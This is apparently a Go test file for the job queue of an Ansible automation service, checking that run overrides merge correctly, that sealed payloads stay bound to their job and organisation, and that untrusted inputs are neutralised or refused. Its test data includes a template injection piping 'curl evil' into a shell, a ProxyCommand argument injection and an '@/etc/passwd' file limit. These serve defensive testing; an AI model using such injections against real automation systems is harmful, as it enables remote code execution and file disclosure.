package jobs

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/noixdev/pulsix/internal/crypto"
	"github.com/noixdev/pulsix/internal/inventory/render"
	"github.com/noixdev/pulsix/internal/pb/workerpb"
)

func sealedOverride(t *testing.T, q *SQLQueue, job Job, ov RunOverrides) json.RawMessage {
	t.Helper()
	svc := &Service{box: q.box}
	raw, err := json.Marshal(ov)
	if err != nil {
		t.Fatal(err)
	}
	p, err := svc.sealPayload(job, raw)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func TestBuildPayloadMergesRunOverrides(t *testing.T) {
	org, zone, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	schemaRaw := json.RawMessage(`{"fields":[{"name":"token","type":"secret"},{"name":"region","type":"string"},{"name":"replicas","type":"int"}]}`)
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {
		ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n",
		Limit: "all", ExtraVars: json.RawMessage(`{"region":"eu","replicas":1}`), ExtraVarsSchema: schemaRaw,
	}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: zone, Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	limit := "web*"
	job.Payload = sealedOverride(t, q, job, RunOverrides{Limit: &limit, ExtraVars: map[string]any{"replicas": 3, "token": "override-token-9f2"}})

	out := &workerpb.Job{}
	if err := q.buildPayload(context.Background(), job, out); err != nil {
		t.Fatalf("buildPayload: %v", err)
	}
	if out.Limit != "web*" {
		t.Fatalf("limit = %q", out.Limit)
	}
	if out.ExtraVars["region"] != `"eu"` || out.ExtraVars["replicas"] != "3" || out.ExtraVars["token"] != `"override-token-9f2"` {
		t.Fatalf("extra vars = %v", out.ExtraVars)
	}
	if !strings.Contains(strings.Join(out.Redact, "\n"), "override-token-9f2") {
		t.Fatalf("a secret-typed override must be redacted: %v", out.Redact)
	}
	if out.KindPayload != "" {
		t.Fatalf("run overrides must not leak into kind_payload: %q", out.KindPayload)
	}
}

func TestBuildPayloadRefusesDenylistedOverride(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	job.Payload = sealedOverride(t, q, job, RunOverrides{ExtraVars: map[string]any{"ansible_ssh_common_args": "-o ProxyCommand=evil"}})
	if err := q.buildPayload(context.Background(), job, &workerpb.Job{}); err == nil {
		t.Fatal("a denylisted override var must fail the claim")
	}
}

// TestRunOverridesRefusesUnsealedPayload is fix round 1, minor 2: a run
// job's payload must always be the sealed-string form Service.sealPayload
// writes. Only the service ever writes a run payload, but runOverrides
// treats anything else as untrusted rather than passing it through as
// plaintext overrides (openKindPayload's general fallback, meant for the
// unsealed sync_repo shape, is not safe to reuse here).
func TestRunOverridesRefusesUnsealedPayload(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	// Plain JSON, not the JSON-string-of-base64 sealed form.
	job.Payload = json.RawMessage(`{"limit":"web*"}`)
	if _, err := q.runOverrides(job); err == nil {
		t.Fatal("runOverrides must refuse a payload that is not the sealed-string form")
	}
	if err := q.buildPayload(context.Background(), job, &workerpb.Job{}); err == nil {
		t.Fatal("buildPayload must fail the claim of a run job with an unsealed payload")
	}
}

// TestBuildPayloadRefusesOverrideSealedForAnotherJobOrOrg is fix round 1,
// minor 4: the fake box the other white-box tests in this file use ignores
// AAD entirely, so it cannot exercise the binding — this test uses a real
// crypto.Box, the same pattern TestBuildPayloadFailsOnWrongAAD (adjacent
// file) uses for the other sealed kinds.
func TestBuildPayloadRefusesOverrideSealedForAnotherJobOrOrg(t *testing.T) {
	orgA, orgB, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: orgA, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	var key [32]byte
	copy(key[:], "jobs-cross-org-override-test-ky")
	realBox := crypto.NewBox(key)
	realQueue := *q
	realQueue.box = realBox

	jobA := Job{ID: uuid.Must(uuid.NewV7()), OrgID: orgA, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	raw, err := json.Marshal(RunOverrides{ExtraVars: map[string]any{"a": 1}})
	if err != nil {
		t.Fatal(err)
	}
	sealed, err := realBox.SealAAD(raw, JobAAD(jobA.OrgID, jobA.ID))
	if err != nil {
		t.Fatal(err)
	}
	payload := json.RawMessage(`"` + base64.StdEncoding.EncodeToString(sealed) + `"`)

	// Same org, a different job id: the AAD binds to the job id too.
	jobB := jobA
	jobB.ID = uuid.Must(uuid.NewV7())
	jobB.Payload = payload
	if err := realQueue.buildPayload(context.Background(), jobB, &workerpb.Job{}); err == nil {
		t.Fatal("an override payload sealed for another job must not open")
	}

	// Same job id, a different org.
	jobOrgB := jobA
	jobOrgB.OrgID = orgB
	jobOrgB.Payload = payload
	if err := realQueue.buildPayload(context.Background(), jobOrgB, &workerpb.Job{}); err == nil {
		t.Fatal("an override payload sealed for another org must not open")
	}
}

func TestMergeExtraVars(t *testing.T) {
	got, err := mergeExtraVars(json.RawMessage(`{"a":1,"b":2}`), &RunOverrides{ExtraVars: map[string]any{"b": 3, "c": "x"}})
	if err != nil || string(got) != `{"a":1,"b":3,"c":"x"}` {
		t.Fatalf("merge = %s, %v", got, err)
	}
	if got, _ := mergeExtraVars(json.RawMessage(`{"a":1}`), nil); string(got) != `{"a":1}` {
		t.Fatalf("nil overrides = %s", got)
	}
	if got, _ := mergeExtraVars(nil, &RunOverrides{ExtraVars: map[string]any{"a": 1}}); string(got) != `{"a":1}` {
		t.Fatalf("empty base = %s", got)
	}
	if _, err := mergeExtraVars(json.RawMessage(`[]`), &RunOverrides{ExtraVars: map[string]any{"a": 1}}); err == nil {
		t.Fatal("a non-object base must fail")
	}
	// A JSON "null" base must not panic (fix round 1, minor 1):
	// json.Unmarshal("null", &merged) sets merged to nil even though it
	// started as a non-nil map, and maps.Copy panics assigning into a nil
	// destination map.
	if got, err := mergeExtraVars(json.RawMessage(`null`), &RunOverrides{ExtraVars: map[string]any{"a": 1}}); err != nil || string(got) != `{"a":1}` {
		t.Fatalf("null base = %s, %v", got, err)
	}
}

// TestBuildPayloadMarksUntrustedOverridesUnsafe is final review C1: values
// a webhook payload supplied reach the worker marked unsafe for Ansible, at
// every depth, so "{{ lookup('pipe', …) }}" stays literal text; the
// template's own values stay as they are, and a template secret is still
// redacted.
func TestBuildPayloadMarksUntrustedOverridesUnsafe(t *testing.T) {
	org, zone, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	schemaRaw := json.RawMessage(`{"fields":[{"name":"token","type":"secret"},{"name":"branch","type":"string"},{"name":"tags","type":"list","item":{"name":"tag","type":"string"}},{"name":"replicas","type":"int"}]}`)
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {
		ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n",
		Limit: "all", ExtraVars: json.RawMessage(`{"branch":"{{ template_default }}","token":"template-secret-4c1"}`), ExtraVarsSchema: schemaRaw,
	}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: zone, Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	inject := "{{ lookup('pipe', 'curl evil|sh') }}"
	job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, ExtraVars: map[string]any{
		"branch": inject, "tags": []any{"v1", "{% raw %}x"}, "replicas": float64(2),
	}})

	out := &workerpb.Job{}
	if err := q.buildPayload(context.Background(), job, out); err != nil {
		t.Fatalf("buildPayload: %v", err)
	}
	wantBranch, _ := json.Marshal(map[string]string{"__ansible_unsafe": inject})
	if out.ExtraVars["branch"] != string(wantBranch) {
		t.Fatalf("branch = %s, want %s", out.ExtraVars["branch"], wantBranch)
	}
	if out.ExtraVars["tags"] != `[{"__ansible_unsafe":"v1"},{"__ansible_unsafe":"{% raw %}x"}]` {
		t.Fatalf("tags = %s", out.ExtraVars["tags"])
	}
	if out.ExtraVars["replicas"] != "2" {
		t.Fatalf("replicas = %s", out.ExtraVars["replicas"])
	}
	// The template's own values are the operator's and keep templating.
	if out.ExtraVars["token"] != `"template-secret-4c1"` {
		t.Fatalf("token = %s", out.ExtraVars["token"])
	}
	if !strings.Contains(strings.Join(out.Redact, "\n"), "template-secret-4c1") {
		t.Fatalf("the template's secret must stay redacted: %v", out.Redact)
	}
}

// TestBuildPayloadKeepsTrustedOverridesRenderable: a schedule's overrides
// come from an operator (spec §14) and keep Ansible's templating.
func TestBuildPayloadKeepsTrustedOverridesRenderable(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	job.Payload = sealedOverride(t, q, job, RunOverrides{ExtraVars: map[string]any{"when": "{{ ansible_date_time.date }}"}})
	out := &workerpb.Job{}
	if err := q.buildPayload(context.Background(), job, out); err != nil {
		t.Fatalf("buildPayload: %v", err)
	}
	if out.ExtraVars["when"] != `"{{ ansible_date_time.date }}"` {
		t.Fatalf("when = %s", out.ExtraVars["when"])
	}
}

// TestBuildPayloadRefusesUntrustedFileLimit: the claim re-checks an
// untrusted limit, so a payload that bypassed the receive-time check still
// cannot make Ansible read a file on the worker.
func TestBuildPayloadRefusesUntrustedFileLimit(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
	limit := "@/etc/passwd"
	job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, Limit: &limit})
	err := q.buildPayload(context.Background(), job, &workerpb.Job{})
	if err == nil || strings.Contains(err.Error(), limit) {
		t.Fatalf("an untrusted file limit must fail the claim without echoing it: %v", err)
	}
}

// TestBuildPayloadRefusesReservedAnsibleKeys is final re-review New
// Breakage 1, the claim's half: a stored or sealed untrusted override that
// carries an "__ansible" object key (at any depth) fails the claim, and so
// does a template value holding a malformed marker next to an untrusted
// override — either would make Ansible's JSON load of the extra-vars file
// fail and fall back to YAML, dropping every unsafe marker. Trusted runs
// keep the operator's values as they are.
func TestBuildPayloadRefusesReservedAnsibleKeys(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	brokenID := uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{
		templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"},
		brokenID: {ID: brokenID, OrgID: org, PlaybookInline: "- hosts: all\n",
			ExtraVars: json.RawMessage(`{"odd":{"__ansible_unsafe":7}}`)},
	}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	newJob := func(tid uuid.UUID, ov RunOverrides) Job {
		j := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &tid, HostIDs: testHosts}
		j.Payload = sealedOverride(t, q, j, ov)
		return j
	}
	for name, vars := range map[string]map[string]any{
		"top level":     {"branch": map[string]any{"__ansible_unsafe": "x"}},
		"vault in list": {"labels": []any{map[string]any{"ok": "y"}, map[string]any{"__ansible_vault": float64(1)}}},
		"deep type key": {"a": map[string]any{"b": map[string]any{"__ansible_type": "x"}}},
	} {
		err := q.buildPayload(context.Background(), newJob(templateID, RunOverrides{Untrusted: true, ExtraVars: vars}), &workerpb.Job{})
		if !errors.Is(err, ErrInvalidInput) || strings.Contains(err.Error(), "__ansible_unsafe\":") {
			t.Fatalf("%s: an untrusted reserved key must fail the claim: %v", name, err)
		}
	}
	// The same key from an operator (a trusted override) is theirs to set.
	trusted := newJob(templateID, RunOverrides{ExtraVars: map[string]any{"branch": map[string]any{"__ansible_unsafe": "x"}}})
	if err := q.buildPayload(context.Background(), trusted, &workerpb.Job{}); err != nil {
		t.Fatalf("a trusted override keeps its keys: %v", err)
	}
	// A template's malformed marker would break the JSON load too, and with
	// it the markers on the untrusted values: refused for untrusted runs.
	err := q.buildPayload(context.Background(), newJob(brokenID, RunOverrides{Untrusted: true, ExtraVars: map[string]any{"branch": "main"}}), &workerpb.Job{})
	if !errors.Is(err, ErrInvalidInput) {
		t.Fatalf("a malformed template marker next to an untrusted override must fail the claim: %v", err)
	}
	if err := q.buildPayload(context.Background(), newJob(brokenID, RunOverrides{ExtraVars: map[string]any{"branch": "main"}}), &workerpb.Job{}); err != nil {
		t.Fatalf("a trusted run keeps the template's own values: %v", err)
	}
}

// TestBuildPayloadRefusesDeepUntrustedOverridesWithoutEchoingKeys is final
// re-review 2 (New Breakage 1 and minor 3): a sealed untrusted override
// nested deeper than the cap fails the claim, and the failure reason names
// only the variable (the mapping target), never a key the sender chose.
func TestBuildPayloadRefusesDeepUntrustedOverridesWithoutEchoingKeys(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	var deep any = "leaf"
	for range 300 {
		deep = []any{deep}
	}
	for name, v := range map[string]any{
		"deep":         deep,
		"reserved key": map[string]any{"sender-chosen-a": map[string]any{"__ansible_sender_chosen_b": "x"}},
	} {
		job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
		job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, ExtraVars: map[string]any{"release": v}})
		err := q.buildPayload(context.Background(), job, &workerpb.Job{})
		if !errors.Is(err, ErrInvalidInput) || !strings.Contains(err.Error(), "release") || strings.Contains(err.Error(), "sender") {
			t.Fatalf("%s: claim error = %v; want ErrInvalidInput naming only the variable", name, err)
		}
	}
}

// TestBuildPayloadRefusesTopLevelAnsibleMarkerNames is final re-review 2,
// minor 4: a template extra var named like one of Ansible's JSON markers
// breaks the whole extra-vars document, so no run may carry one.
func TestBuildPayloadRefusesTopLevelAnsibleMarkerNames(t *testing.T) {
	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n",
		ExtraVars: json.RawMessage(`{"__ansible_unsafe":{"__ansible_unsafe":"v"}}`)}}}
	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
	q.SetKeyPins(fakePins{})
	for _, untrusted := range []bool{true, false} {
		job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
		job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: untrusted, ExtraVars: map[string]any{"branch": "main"}})
		if err := q.buildPayload(context.Background(), job, &workerpb.Job{}); !errors.Is(err, ErrInvalidInput) {
			t.Fatalf("untrusted=%v: a top-level __ansible name must fail the claim: %v", untrusted, err)
		}
	}
}
